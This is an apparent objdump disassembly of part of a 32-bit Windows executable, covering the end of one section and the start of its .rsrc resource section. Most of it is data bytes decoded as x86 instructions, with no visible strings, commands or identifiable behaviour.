  40eb0a:	add    BYTE PTR [eax],al
  40eb0c:	push   0x40ed
  40eb11:	add    BYTE PTR [eax],al
  40eb13:	add    BYTE PTR [eax],al
  40eb15:	add    BYTE PTR [eax],al
  40eb17:	add    al,al
  40eb19:	mov    ebx,0xc0480040
  40eb1e:	inc    eax
  40eb1f:	add    al,cl
  40eb21:	rol    DWORD PTR [eax+0x0],0xa8
  40eb25:	in     al,dx
  40eb26:	inc    eax
  40eb27:	add    BYTE PTR [eax-0x16],dl
  40eb2a:	inc    eax
  40eb2b:	add    BYTE PTR [ecx],al
  40eb2d:	add    BYTE PTR [eax],al
  40eb2f:	add    BYTE PTR [eax-0x16],dl
  40eb32:	inc    eax
  40eb33:	add    BYTE PTR [eax],ah
  40eb35:	in     eax,0x40
  40eb37:	add    al,ch
  40eb39:	mov    ecx,0xb9d80040
  40eb3e:	inc    eax
  40eb3f:	add    ch,bh
  40eb41:	xchg   esi,eax
  40eb42:	inc    eax
  40eb43:	add    ch,bh
  40eb45:	xchg   esi,eax
  40eb46:	inc    eax
  40eb47:	add    ch,bh
  40eb49:	xchg   esi,eax
  40eb4a:	inc    eax
  40eb4b:	add    ch,bh
  40eb4d:	xchg   esi,eax
  40eb4e:	inc    eax
  40eb4f:	add    ch,bh
  40eb51:	xchg   esi,eax
  40eb52:	inc    eax
  40eb53:	add    ch,bh
  40eb55:	xchg   esi,eax
  40eb56:	inc    eax
  40eb57:	add    ch,bh
  40eb59:	xchg   esi,eax
  40eb5a:	inc    eax
  40eb5b:	add    ch,bh
  40eb5d:	xchg   esi,eax
  40eb5e:	inc    eax
  40eb5f:	add    ch,bh
  40eb61:	xchg   esi,eax
  40eb62:	inc    eax
  40eb63:	add    ch,bh
  40eb65:	xchg   esi,eax
  40eb66:	inc    eax
	...
  40eb73:	add    BYTE PTR [ecx],al
  40eb75:	add    BYTE PTR [eax],al
  40eb77:	add    BYTE PTR [eax],al
  40eb79:	add    BYTE PTR [eax],al
  40eb7b:	add    BYTE PTR [ecx],al
	...
  40eb89:	add    BYTE PTR [eax],al
  40eb8b:	add    BYTE PTR [ecx],al
  40eb8d:	add    BYTE PTR [eax],al
  40eb8f:	add    BYTE PTR [eax],al
  40eb91:	add    BYTE PTR [eax],al
  40eb93:	add    BYTE PTR [ecx],al
	...
  40eba1:	add    BYTE PTR [eax],al
  40eba3:	add    BYTE PTR [ecx],al
  40eba5:	add    BYTE PTR [eax],al
  40eba7:	add    BYTE PTR [eax],al
  40eba9:	add    BYTE PTR [eax],al
  40ebab:	add    BYTE PTR [ecx],al
  40ebad:	add    BYTE PTR [eax],al
  40ebaf:	add    BYTE PTR [eax],al
  40ebb1:	add    BYTE PTR [eax],al
  40ebb3:	add    BYTE PTR [ecx],al
	...
  40ebc1:	add    BYTE PTR [eax],al
  40ebc3:	add    BYTE PTR [ecx],al
	...
  40ebd1:	add    BYTE PTR [eax],al
  40ebd3:	add    BYTE PTR [ecx],al
  40ebd5:	add    BYTE PTR [eax],al
  40ebd7:	add    BYTE PTR [eax],al
  40ebd9:	add    BYTE PTR [eax],al
  40ebdb:	add    BYTE PTR [ecx],al
  40ebdd:	add    BYTE PTR [eax],al
  40ebdf:	add    BYTE PTR [eax],al
  40ebe1:	add    BYTE PTR [eax],al
  40ebe3:	add    BYTE PTR [ecx],al
	...
  40ebf1:	add    BYTE PTR [eax],al
  40ebf3:	add    BYTE PTR [ecx],al
  40ebf5:	add    BYTE PTR [eax],al
  40ebf7:	add    BYTE PTR [eax],al
  40ebf9:	add    BYTE PTR [eax],al
  40ebfb:	add    BYTE PTR [ecx],al
  40ebfd:	add    BYTE PTR [eax],al
  40ebff:	add    BYTE PTR [eax],al
  40ec01:	add    BYTE PTR [eax],al
  40ec03:	add    BYTE PTR [ecx],al
	...
  40ec8d:	add    BYTE PTR [eax],al
  40ec8f:	add    BYTE PTR [edx],al
	...
  40ec9d:	add    BYTE PTR [eax],al
  40ec9f:	add    al,al
  40eca1:	mov    ebx,0xbdc20040
  40eca6:	inc    eax
  40eca7:	add    al,dh
  40eca9:	ret    
  40ecaa:	inc    eax
  40ecab:	add    ah,ch
  40ecad:	ret    
  40ecae:	inc    eax
  40ecaf:	add    al,ch
  40ecb1:	ret    
  40ecb2:	inc    eax
  40ecb3:	add    ah,ah
  40ecb5:	ret    
  40ecb6:	inc    eax
  40ecb7:	add    al,ah
  40ecb9:	ret    
  40ecba:	inc    eax
  40ecbb:	add    ah,bl
  40ecbd:	ret    
  40ecbe:	inc    eax
  40ecbf:	add    al,bl
  40ecc1:	ret    
  40ecc2:	inc    eax
  40ecc3:	add    al,dl
  40ecc5:	ret    
  40ecc6:	inc    eax
  40ecc7:	add    al,cl
  40ecc9:	ret    
  40ecca:	inc    eax
  40eccb:	add    al,al
  40eccd:	ret    
  40ecce:	inc    eax
  40eccf:	add    BYTE PTR [ebx+eax*8-0x3c57ffc0],dh
  40ecd6:	inc    eax
  40ecd7:	add    BYTE PTR [eax-0x6bffbf3d],ah
  40ecdd:	ret    
  40ecde:	inc    eax
  40ecdf:	add    BYTE PTR [eax-0x73ffbf3d],dl
  40ece5:	ret    
  40ece6:	inc    eax
  40ece7:	add    BYTE PTR [eax-0x7bffbf3d],cl
  40eced:	ret    
  40ecee:	inc    eax
  40ecef:	add    BYTE PTR [eax+0x7c0040c3],al
  40ecf5:	ret    
  40ecf6:	inc    eax
  40ecf7:	add    BYTE PTR [eax-0x3d],bh
  40ecfa:	inc    eax
  40ecfb:	add    BYTE PTR [ebx+eax*8+0x40],dh
  40ecff:	add    BYTE PTR [eax-0x3d],dh
  40ed02:	inc    eax
  40ed03:	add    BYTE PTR [ebx+eax*8+0x40],ch
  40ed07:	add    BYTE PTR [eax-0x3d],ch
  40ed0a:	inc    eax
  40ed0b:	add    BYTE PTR [ebx+eax*8+0x40],ah
  40ed0f:	add    BYTE PTR [ebx+eax*8+0x40],bl
  40ed13:	add    BYTE PTR [eax-0x3d],dl
  40ed16:	inc    eax
  40ed17:	add    BYTE PTR [eax-0x3d],cl
  40ed1a:	inc    eax
  40ed1b:	add    BYTE PTR [eax-0x3d],al
  40ed1e:	inc    eax
  40ed1f:	add    BYTE PTR [eax+0x380040c3],al
  40ed25:	ret    
  40ed26:	inc    eax
  40ed27:	add    BYTE PTR [eax],dh
  40ed29:	ret    
  40ed2a:	inc    eax
  40ed2b:	add    BYTE PTR [eax],ch
  40ed2d:	ret    
  40ed2e:	inc    eax
  40ed2f:	add    BYTE PTR [ebx+eax*8],bl
  40ed32:	inc    eax
  40ed33:	add    BYTE PTR [ebx+eax*8],dl
  40ed36:	inc    eax
  40ed37:	add    BYTE PTR [eax],cl
  40ed39:	ret    
  40ed3a:	inc    eax
  40ed3b:	add    ah,bh
  40ed3d:	ret    0x40
  40ed40:	clc    
  40ed41:	ret    0x40
  40ed44:	hlt    
  40ed45:	ret    0x40
  40ed48:	call   0xd4412e0f
  40ed4d:	ret    0x40
  40ed50:	enter  0x40c2,0x0
  40ed54:	or     DWORD PTR [eax+eax*1],eax
  40ed57:	add    BYTE PTR [ecx],al
  40ed59:	add    BYTE PTR [eax],al
  40ed5b:	add    BYTE PTR [eax],al
  40ed5d:	add    BYTE PTR [eax],al
  40ed5f:	add    BYTE PTR [eax+0x2e0040ec],ch
  40ed65:	add    BYTE PTR [eax],al
  40ed67:	add    BYTE PTR [ebp+ebp*8+0x40],ah
  40ed6b:	add    BYTE PTR [eax-0x5fffbf07],ah
  40ed71:	stc    
  40ed72:	inc    eax
  40ed73:	add    BYTE PTR [eax-0x5fffbf07],ah
  40ed79:	stc    
  40ed7a:	inc    eax
  40ed7b:	add    BYTE PTR [eax-0x5fffbf07],ah
  40ed81:	stc    
  40ed82:	inc    eax
  40ed83:	add    BYTE PTR [eax-0x5fffbf07],ah
  40ed89:	stc    
  40ed8a:	inc    eax
  40ed8b:	add    BYTE PTR [eax+0x7f0040f9],ah
  40ed91:	jg     0x40ee12
  40ed93:	jg     0x40ee14
  40ed95:	jg     0x40ee16
  40ed97:	jg     0x40ee01
  40ed99:	in     eax,dx
  40ed9a:	inc    eax
  40ed9b:	add    BYTE PTR [ecx],al
  40ed9d:	add    BYTE PTR [eax],al
  40ed9f:	add    BYTE PTR [esi],ch
  40eda1:	add    BYTE PTR [eax],al
  40eda3:	add    BYTE PTR [ecx],al
	...
  40edad:	add    BYTE PTR [eax],al
  40edaf:	add    BYTE PTR [ebx],al
  40edb1:	add    BYTE PTR [eax],al
  40edb3:	add    BYTE PTR [eax],ah
  40edb5:	add    eax,0x1993
	...
  40edc2:	add    BYTE PTR [eax],al
  40edc4:	(bad)  
  40edc5:	(bad)  
  40edc6:	(bad)  
  40edc7:	(bad)  
  40edc8:	(bad)  
  40edc9:	(bad)  
  40edca:	(bad)  
  40edcb:	inc    DWORD PTR [eax]
  40edcd:	add    BYTE PTR [eax],al
  40edcf:	add    BYTE PTR [eax+0x1000070],al
  40edd5:	add    BYTE PTR [eax],al
  40edd7:	add    al,dh
  40edd9:	icebp  
  40edda:	(bad)  
  40eddb:	inc    DWORD PTR [eax]
  40eddd:	add    BYTE PTR [eax],al
  40eddf:	add    BYTE PTR [eax+0x53],dl
  40ede2:	push   esp
	...
  40ee1f:	add    BYTE PTR [eax+0x44],dl
  40ee22:	push   esp
	...
  40ee5f:	add    al,ah
  40ee61:	in     eax,dx
  40ee62:	inc    eax
  40ee63:	add    BYTE PTR [eax],ah
  40ee65:	out    dx,al
  40ee66:	inc    eax
  40ee67:	add    bh,bh
  40ee69:	(bad)  
  40ee6a:	(bad)  
  40ee6b:	inc    DWORD PTR [eax]
  40ee6d:	add    BYTE PTR [eax],al
  40ee6f:	add    BYTE PTR [eax],al
  40ee71:	add    BYTE PTR [eax],al
  40ee73:	add    bh,bh
  40ee75:	(bad)  
  40ee76:	(bad)  
  40ee77:	inc    DWORD PTR [eax]
  40ee79:	add    BYTE PTR [eax],al
  40ee7b:	add    BYTE PTR [eax],al
  40ee7d:	add    BYTE PTR [eax],al
  40ee7f:	add    bh,bh
  40ee81:	(bad)  
  40ee82:	(bad)  
  40ee83:	call   FWORD PTR [esi]
  40ee85:	add    BYTE PTR [eax],al
  40ee87:	add    BYTE PTR [ebx],bh
  40ee89:	add    BYTE PTR [eax],al
  40ee8b:	add    BYTE PTR [edx+0x0],bl
  40ee8e:	add    BYTE PTR [eax],al
  40ee90:	js     0x40ee92
  40ee92:	add    BYTE PTR [eax],al
  40ee94:	xchg   edi,eax
  40ee95:	add    BYTE PTR [eax],al
  40ee97:	add    BYTE PTR [ebp-0x2c000000],dh
  40ee9d:	add    BYTE PTR [eax],al
  40ee9f:	add    bl,dh
  40eea1:	add    BYTE PTR [eax],al
  40eea3:	add    BYTE PTR [ecx],dl
  40eea5:	add    DWORD PTR [eax],eax
  40eea7:	add    BYTE PTR [eax],dh
  40eea9:	add    DWORD PTR [eax],eax
  40eeab:	add    BYTE PTR [esi+0x1],cl
  40eeae:	add    BYTE PTR [eax],al
  40eeb0:	ins    DWORD PTR es:[edi],dx
  40eeb1:	add    DWORD PTR [eax],eax
  40eeb3:	add    bh,bh
  40eeb5:	(bad)  
  40eeb6:	(bad)  
  40eeb7:	call   FWORD PTR [esi]
  40eeb9:	add    BYTE PTR [eax],al
  40eebb:	add    BYTE PTR [edx],bh
  40eebd:	add    BYTE PTR [eax],al
  40eebf:	add    BYTE PTR [ecx+0x0],bl
  40eec2:	add    BYTE PTR [eax],al
  40eec4:	ja     0x40eec6
  40eec6:	add    BYTE PTR [eax],al
  40eec8:	xchg   esi,eax
  40eec9:	add    BYTE PTR [eax],al
  40eecb:	add    BYTE PTR [eax+eax*1+0xd30000],dh
  40eed2:	add    BYTE PTR [eax],al
  40eed4:	repnz add BYTE PTR [eax],al
  40eed7:	add    BYTE PTR [eax],dl
  40eed9:	add    DWORD PTR [eax],eax
  40eedb:	add    BYTE PTR [edi],ch
  40eedd:	add    DWORD PTR [eax],eax
  40eedf:	add    BYTE PTR [ebp+0x1],cl
  40eee2:	add    BYTE PTR [eax],al
  40eee4:	ins    BYTE PTR es:[edi],dx
  40eee5:	add    DWORD PTR [eax],eax
	...

Disassembly of section .rsrc:

00413000 <.rsrc>:
	...
  413008:	add    al,0x0
  41300a:	add    BYTE PTR [eax],al
  41300c:	add    BYTE PTR [eax],al
  41300e:	pop    es
  41300f:	add    BYTE PTR [edx],al
  413011:	add    BYTE PTR [eax],al
  413013:	add    BYTE PTR [eax+0x0],cl
  413016:	add    BYTE PTR [eax+0x3],al
  41301c:	pusha  
  41301d:	add    BYTE PTR [eax],al
  41301f:	add    BYTE PTR [eax+eax*1],0x0
  413023:	add    BYTE PTR [eax+0x6800000],ah
  413029:	add    BYTE PTR [eax],al
  41302b:	add    BYTE PTR [eax+0x9800000],bh
  413031:	add    BYTE PTR [eax],al
  413033:	add    al,dl
  413035:	add    BYTE PTR [eax],al
  413037:	or     BYTE PTR [esi],0x0
  41303a:	add    BYTE PTR [eax],al
  41303c:	call   0x18c13041
  413041:	add    BYTE PTR [eax],al
  413043:	add    BYTE PTR [eax],cl
  413045:	add    DWORD PTR [eax],eax
  413047:	add    BYTE PTR [eax],0x0
  41304a:	add    BYTE PTR [eax],al
  41304c:	add    BYTE PTR [eax],al
  41304e:	add    BYTE PTR [eax],al
  413050:	add    al,0x0
  413052:	add    BYTE PTR [eax],al
  413054:	add    BYTE PTR [eax],al
  413056:	add    DWORD PTR [eax],eax
  413058:	outs   dx,BYTE PTR ds:[esi]
  413059:	add    BYTE PTR [eax],al
  41305b:	add    BYTE PTR [eax],ah
  41305d:	add    DWORD PTR [eax],eax
  41305f:	add    BYTE PTR [eax],0x0
  413062:	add    BYTE PTR [eax],al
  413064:	add    BYTE PTR [eax],al
  413066:	add    BYTE PTR [eax],al
  413068:	add    al,0x0
  41306a:	add    BYTE PTR [eax],al
  41306c:	add    BYTE PTR [eax],al
  41306e:	push   es
  41306f:	add    BYTE PTR [ecx],al
  413071:	add    BYTE PTR [eax],al
  413073:	add    BYTE PTR [eax],bh
  413075:	add    DWORD PTR [eax],eax
  413077:	add    BYTE PTR [edx],0x0
  41307a:	add    BYTE PTR [eax],al
  41307c:	push   eax
  41307d:	add    DWORD PTR [eax],eax
  41307f:	add    BYTE PTR [ebx],0x0
  413082:	add    BYTE PTR [eax],al
  413084:	push   0x4800001
  413089:	add    BYTE PTR [eax],al
  41308b:	add    BYTE PTR [eax+0x5800001],al
  413091:	add    BYTE PTR [eax],al
  413093:	add    BYTE PTR [eax+0x6800001],bl
  413099:	add    BYTE PTR [eax],al
  41309b:	add    BYTE PTR [eax+0x800001],dh
  4130a1:	add    BYTE PTR [eax],al
  4130a3:	add    BYTE PTR [eax],al
  4130a5:	add    BYTE PTR [eax],al
  4130a7:	add    BYTE PTR [eax+eax*1],al
  4130aa:	add    BYTE PTR [eax],al
  4130ac:	add    BYTE PTR [eax],al
  4130ae:	add    DWORD PTR [eax],eax
  4130b0:	ins    DWORD PTR es:[edi],dx
  4130b1:	add    BYTE PTR [eax],al
  4130b3:	add    al,cl
  4130b5:	add    DWORD PTR [eax],eax
  4130b7:	add    BYTE PTR [eax],0x0
  4130ba:	add    BYTE PTR [eax],al
  4130bc:	add    BYTE PTR [eax],al
  4130be:	add    BYTE PTR [eax],al
  4130c0:	add    al,0x0
  4130c2:	add    BYTE PTR [eax],al
  4130c4:	add    BYTE PTR [eax],al
  4130c6:	add    DWORD PTR [eax],eax
  4130c8:	pop    es
  4130c9:	add    BYTE PTR [eax],al
  4130cb:	add    al,ah
  4130cd:	add    DWORD PTR [eax],eax
  4130cf:	add    BYTE PTR [eax],0x0
  4130d2:	add    BYTE PTR [eax],al
  4130d4:	add    BYTE PTR [eax],al
  4130d6:	add    BYTE PTR [eax],al
  4130d8:	add    al,0x0
  4130da:	add    BYTE PTR [eax],al
  4130dc:	add    BYTE PTR [eax],al
  4130de:	add    DWORD PTR [eax],eax
  4130e0:	ins    DWORD PTR es:[edi],dx
  4130e1:	add    BYTE PTR [eax],al
  4130e3:	add    al,bh
  4130e5:	add    DWORD PTR [eax],eax
  4130e7:	add    BYTE PTR [eax],0x0
  4130ea:	add    BYTE PTR [eax],al
  4130ec:	add    BYTE PTR [eax],al
  4130ee:	add    BYTE PTR [eax],al
  4130f0:	add    al,0x0
  4130f2:	add    BYTE PTR [eax],al
  4130f4:	add    BYTE PTR [eax],al
  4130f6:	add    al,BYTE PTR [eax]
  4130f8:	imul   eax,DWORD PTR [eax],0x0
  4130fb:	add    BYTE PTR [eax],dl
  4130fd:	add    al,BYTE PTR [eax]
  4130ff:	sub    BYTE PTR [eax+eax*1+0x0],0x0
  413104:	sub    BYTE PTR [edx],al
  413106:	add    BYTE PTR [eax+0x0],al
  41310c:	add    BYTE PTR [eax],al
  41310e:	add    BYTE PTR [eax],al
  413110:	add    al,0x0
  413112:	add    BYTE PTR [eax],al
  413114:	add    BYTE PTR [eax],al
  413116:	add    DWORD PTR [eax],eax
  413118:	add    DWORD PTR [eax],eax
  41311a:	add    BYTE PTR [eax],al
  41311c:	inc    eax
  41311d:	add    al,BYTE PTR [eax]
  41311f:	add    BYTE PTR [eax],0x0
  413122:	add    BYTE PTR [eax],al
  413124:	add    BYTE PTR [eax],al
  413126:	add    BYTE PTR [eax],al
  413128:	add    al,0x0
  41312a:	add    BYTE PTR [eax],al
  41312c:	add    BYTE PTR [eax],al
  41312e:	add    DWORD PTR [eax],eax
  413130:	or     DWORD PTR [eax+eax*1],eax
  413133:	add    BYTE PTR [eax+0x2],bl
	...
  41313e:	add    BYTE PTR [eax],al
  413140:	add    al,0x0
  413142:	add    BYTE PTR [eax],al
  413144:	add    BYTE PTR [eax],al
  413146:	add    DWORD PTR [eax],eax
  413148:	or     DWORD PTR [eax+eax*1],eax
  41314b:	add    BYTE PTR [eax+0x2],ch
	...
  413156:	add    BYTE PTR [eax],al
  413158:	add    al,0x0
  41315a:	add    BYTE PTR [eax],al
  41315c:	add    BYTE PTR [eax],al
  41315e:	add    DWORD PTR [eax],eax
  413160:	or     DWORD PTR [eax+eax*1],eax
  413163:	add    BYTE PTR [eax+0x2],bh
	...
  41316e:	add    BYTE PTR [eax],al
  413170:	add    al,0x0
  413172:	add    BYTE PTR [eax],al
  413174:	add    BYTE PTR [eax],al
  413176:	add    DWORD PTR [eax],eax
  413178:	or     DWORD PTR [eax+eax*1],eax
  41317b:	add    BYTE PTR [eax+0x2],cl
  413181:	add    BYTE PTR [eax],al
  413183:	add    BYTE PTR [eax],al
  413185:	add    BYTE PTR [eax],al
  413187:	add    BYTE PTR [eax+eax*1],al
  41318a:	add    BYTE PTR [eax],al
  41318c:	add    BYTE PTR [eax],al
  41318e:	add    DWORD PTR [eax],eax
  413190:	or     DWORD PTR [eax+eax*1],eax
  413193:	add    BYTE PTR [eax+0x2],bl
  413199:	add    BYTE PTR [eax],al
  41319b:	add    BYTE PTR [eax],al
  41319d:	add    BYTE PTR [eax],al
  41319f:	add    BYTE PTR [eax+eax*1],al
  4131a2:	add    BYTE PTR [eax],al
  4131a4:	add    BYTE PTR [eax],al
  4131a6:	add    DWORD PTR [eax],eax
  4131a8:	or     DWORD PTR [eax+eax*1],eax
  4131ab:	add    BYTE PTR [eax+0x2],ch
  4131b1:	add    BYTE PTR [eax],al
  4131b3:	add    BYTE PTR [eax],al
  4131b5:	add    BYTE PTR [eax],al
  4131b7:	add    BYTE PTR [eax+eax*1],al
  4131ba:	add    BYTE PTR [eax],al
  4131bc:	add    BYTE PTR [eax],al
  4131be:	add    DWORD PTR [eax],eax
  4131c0:	or     DWORD PTR [eax+eax*1],eax
  4131c3:	add    BYTE PTR [eax+0x2],bh
  4131c9:	add    BYTE PTR [eax],al
  4131cb:	add    BYTE PTR [eax],al
  4131cd:	add    BYTE PTR [eax],al
  4131cf:	add    BYTE PTR [eax+eax*1],al
  4131d2:	add    BYTE PTR [eax],al
  4131d4:	add    BYTE PTR [eax],al
  4131d6:	add    DWORD PTR [eax],eax
  4131d8:	or     DWORD PTR [eax+eax*1],eax
  4131db:	add    al,cl
  4131dd:	add    al,BYTE PTR [eax]
	...
  4131e7:	add    BYTE PTR [eax+eax*1],al
  4131ea:	add    BYTE PTR [eax],al
  4131ec:	add    BYTE PTR [eax],al
  4131ee:	add    DWORD PTR [eax],eax
  4131f0:	or     DWORD PTR [eax+eax*1],eax
  4131f3:	add    al,bl
  4131f5:	add    al,BYTE PTR [eax]
	...
  4131ff:	add    BYTE PTR [eax+eax*1],al
  413202:	add    BYTE PTR [eax],al
  413204:	add    BYTE PTR [eax],al
  413206:	add    DWORD PTR [eax],eax
  413208:	or     DWORD PTR [eax+eax*1],eax
  41320b:	add    al,ch
  41320d:	add    al,BYTE PTR [eax]
	...
  413217:	add    BYTE PTR [eax+eax*1],al
  41321a:	add    BYTE PTR [eax],al
  41321c:	add    BYTE PTR [eax],al
  41321e:	add    DWORD PTR [eax],eax
  413220:	or     DWORD PTR [eax+eax*1],eax
  413223:	add    al,bh
  413225:	add    al,BYTE PTR [eax]
	...
  41322f:	add    BYTE PTR [eax+eax*1],al
  413232:	add    BYTE PTR [eax],al
  413234:	add    BYTE PTR [eax],al
  413236:	add    DWORD PTR [eax],eax
  413238:	or     DWORD PTR [eax+eax*1],eax
  41323b:	add    BYTE PTR [eax],cl
  41323d:	add    eax,DWORD PTR [eax]
	...
  413247:	add    BYTE PTR [eax+eax*1],al
  41324a:	add    BYTE PTR [eax],al
  41324c:	add    BYTE PTR [eax],al
  41324e:	add    DWORD PTR [eax],eax
  413250:	or     DWORD PTR [eax+eax*1],eax
  413253:	add    BYTE PTR [eax],bl
  413255:	add    eax,DWORD PTR [eax]
  413257:	add    BYTE PTR [eax],ch
  413259:	xor    eax,DWORD PTR [ecx]
  41325b:	add    BYTE PTR [edx-0x1bffffb7],al
  413261:	add    al,0x0
  413263:	add    BYTE PTR [eax],al
  413265:	add    BYTE PTR [eax],al
  413267:	add    BYTE PTR [esp+edi*2+0x3ef40001],ch
  41326e:	add    DWORD PTR [eax],eax
  413270:	in     al,0x4
  413272:	add    BYTE PTR [eax],al
  413274:	add    BYTE PTR [eax],al
  413276:	add    BYTE PTR [eax],al
  413278:	mov    al,ds:0xa80002bb
  41327d:	and    eax,0x4e40000
  413282:	add    BYTE PTR [eax],al
  413284:	add    BYTE PTR [eax],al
  413286:	add    BYTE PTR [eax],al
  413288:	dec    eax
  413289:	loope  0x41328d
  41328b:	add    BYTE PTR [eax-0x1bfffff0],ch
  413291:	add    al,0x0
  413293:	add    BYTE PTR [eax],al
  413295:	add    BYTE PTR [eax],al
  413297:	add    al,dh
  413299:	icebp  
  41329a:	add    al,BYTE PTR [eax]
  41329c:	mov    BYTE PTR [ecx],cl
  41329e:	add    BYTE PTR [eax],al
  4132a0:	in     al,0x4
  4132a2:	add    BYTE PTR [eax],al
  4132a4:	add    BYTE PTR [eax],al
  4132a6:	add    BYTE PTR [eax],al
  4132a8:	js     0x4132a5
  4132aa:	add    al,BYTE PTR [eax]
  4132ac:	push   0xe4000004
  4132b1:	add    al,0x0
  4132b3:	add    BYTE PTR [eax],al
  4132b5:	add    BYTE PTR [eax],al
  4132b7:	add    al,ah
  4132b9:	inc    DWORD PTR [edx]
  4132bb:	add    BYTE PTR [eax+0x4],ch
  4132be:	add    BYTE PTR [eax],al
  4132c0:	in     al,0x4
  4132c2:	add    BYTE PTR [eax],al
  4132c4:	add    BYTE PTR [eax],al
  4132c6:	add    BYTE PTR [eax],al
  4132c8:	dec    eax
  4132c9:	add    al,0x3
  4132cb:	add    BYTE PTR [edx+0x0],cl
  4132ce:	add    BYTE PTR [eax],al
  4132d0:	in     al,0x4
  4132d2:	add    BYTE PTR [eax],al
  4132d4:	add    BYTE PTR [eax],al
  4132d6:	add    BYTE PTR [eax],al
  4132d8:	xchg   esp,eax
  4132d9:	add    al,0x3
  4132db:	add    BYTE PTR [eax+eax*1+0x0],bl
  4132df:	add    ah,ah
  4132e1:	add    al,0x0
  4132e3:	add    BYTE PTR [eax],al
  4132e5:	add    BYTE PTR [eax],al
  4132e7:	add    al,dh
  4132e9:	add    al,0x3
  4132eb:	add    BYTE PTR [eax],dl
  4132ed:	add    BYTE PTR [eax],al
  4132ef:	add    ah,ah
  4132f1:	add    al,0x0
  4132f3:	add    BYTE PTR [eax],al
  4132f5:	add    BYTE PTR [eax],al
  4132f7:	add    BYTE PTR [eax],al
  4132f9:	add    eax,0x4c0003
  4132fe:	add    BYTE PTR [eax],al
  413300:	in     al,0x4
  413302:	add    BYTE PTR [eax],al
  413304:	add    BYTE PTR [eax],al
  413306:	add    BYTE PTR [eax],al
  413308:	dec    esp
  413309:	add    eax,0x140003
  41330e:	add    BYTE PTR [eax],al
  413310:	in     al,0x4
  413312:	add    BYTE PTR [eax],al
  413314:	add    BYTE PTR [eax],al
  413316:	add    BYTE PTR [eax],al
  413318:	pusha  
  413319:	add    eax,0x2b60003
  41331e:	add    BYTE PTR [eax],al
  413320:	in     al,0x4
  413322:	add    BYTE PTR [eax],al
  413324:	add    BYTE PTR [eax],al
  413326:	add    BYTE PTR [eax],al
  413328:	sub    BYTE PTR [eax],al
  41332a:	add    BYTE PTR [eax],al
  41332c:	pop    eax
  41332d:	add    BYTE PTR [eax],al
  41332f:	add    ah,al
  413331:	add    BYTE PTR [eax],al
  413333:	add    BYTE PTR [ecx],al
  413335:	add    BYTE PTR [eax],cl
  413337:	add    BYTE PTR [ecx],al
  413339:	add    BYTE PTR [eax],al
  41333b:	add    BYTE PTR [ebp+eax*2+0x0],bl
  41333f:	add    BYTE PTR [edx],dl
  413341:	or     eax,DWORD PTR [eax]
  413343:	add    BYTE PTR [edx],dl
  413345:	or     eax,DWORD PTR [eax]
  413347:	add    bh,bh
  413349:	add    BYTE PTR [eax],al
  41334b:	add    bh,bh
  41334d:	add    BYTE PTR [eax],al
  41334f:	add    BYTE PTR [eax],al
  413351:	add    BYTE PTR [eax],al
  413353:	add    bh,bh
  413355:	(bad)  
  413356:	inc    DWORD PTR [eax]
  413358:	adc    al,0x13
  41335a:	mov    ebp,0xe5303200
  41335f:	add    BYTE PTR [ebx+edx*1],dl
  413362:	push   ecx
  413363:	add    BYTE PTR [eax+0x46],cl
  413366:	call   0xa46c616b
  41336b:	add    BYTE PTR ds:0x3e006c23,ah
  413371:	cmp    al,0x81
  413373:	add    BYTE PTR ds:0x3a00d51c,ah
  413379:	rol    BYTE PTR cs:[eax],1
  41337c:	dec    edx
  41337d:	inc    edx
  41337e:	mov    ds:0x281c1d00,eax
  413383:	add    BYTE PTR [esp+edx*2-0x24],ch
  413387:	add    BYTE PTR [ecx+eiz*1],bh
  41338a:	xchg   ebp,eax
  41338b:	add    BYTE PTR [ebx],bh
  41338d:	sub    esi,DWORD PTR [esi+0x0]
  413390:	sub    al,0x24
  413392:	inc    ebx
  413393:	add    BYTE PTR [eax+0x2a],cl
  413396:	bound  eax,QWORD PTR [eax]
  413398:	cmp    edi,DWORD PTR [eax]
  41339a:	cmp    eax,0x4f345500
  41339f:	add    BYTE PTR [esi],ch
  4133a1:	and    ah,BYTE PTR [esi]
  4133a3:	add    BYTE PTR [ecx+0xc],al
  4133a6:	add    al,0x0
  4133a8:	xchg   esi,eax
  4133a9:	sub    dl,BYTE PTR [eax+eax*1]
  4133ac:	cmp    al,0x14
  4133ae:	or     al,0x0
  4133b0:	jbe    0x4133dd
  4133b2:	sbb    eax,0x25368500
  4133b7:	add    BYTE PTR [edi+0x37],ah
  4133ba:	sub    eax,0x42cb400
  4133bf:	add    BYTE PTR [ebp+0x6600042c],ah
  4133c5:	sbb    al,0x4
  4133c7:	add    BYTE PTR [esi],ch
  4133c9:	adc    al,0xc
  4133cb:	add    BYTE PTR [edx-0x77fffbd4],bl
  4133d1:	sub    DWORD PTR [esi],eax
  4133d3:	add    dh,al
  4133d5:	cmp    al,BYTE PTR [eax+eax*1]
  4133d8:	stos   BYTE PTR es:[edi],al
  4133d9:	xor    al,0x4
  4133db:	add    BYTE PTR [edi+0x27],dh
  4133de:	push   es
  4133df:	add    BYTE PTR [esi],bh
  4133e1:	adc    al,0x4
  4133e3:	add    BYTE PTR [esi+0x29],dl
  4133e6:	pop    ss
  4133e7:	add    BYTE PTR [eax+0x56],bh
  4133ea:	dec    eax
  4133eb:	add    BYTE PTR [esi-0x5dfffbc6],dh
  4133f1:	cmp    cl,BYTE PTR ds:0x143c9500
  4133f7:	add    BYTE PTR [ecx+0x3700153a],cl
  4133fd:	and    DWORD PTR [edi],edx
  4133ff:	add    BYTE PTR [edx-0x2bffbea4],bl
  413405:	dec    edx
  413406:	add    al,0x0
  413408:	dec    eax
  413409:	sbb    al,0x5
  41340b:	add    BYTE PTR [edi+0x22],dl
  41340e:	pop    es
  41340f:	add    BYTE PTR [edx-0x37ffe7bc],bl
  413415:	pop    eax
  413416:	and    BYTE PTR [eax],al
  413418:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413419:	dec    edx
  41341a:	sbb    eax,DWORD PTR [eax]
  41341c:	jp     0x413456
  41341e:	push   ss
  41341f:	add    BYTE PTR [eax+0x30],ch
  413422:	adc    eax,0x2f4d8c00
  413427:	add    BYTE PTR [eax+0x4b003d64],dh
  41342d:	xor    BYTE PTR [ebx],ah
  41342f:	add    BYTE PTR [esi-0x3ffa393],cl
  413435:	hlt    
  413436:	lock add al,cl
  413439:	dec    eax
  41343a:	add    al,0x0
  41343c:	push   0x32000729
  413441:	adc    al,0x4
  413443:	add    BYTE PTR ds:0xd9000c1d,bh
  413449:	jg     0x413497
  41344b:	add    BYTE PTR [eax+0x3e],bl
  41344e:	xor    BYTE PTR [eax],al
  413450:	mov    al,0x81
  413452:	addr16 add ch,dh
  413455:	in     al,dx
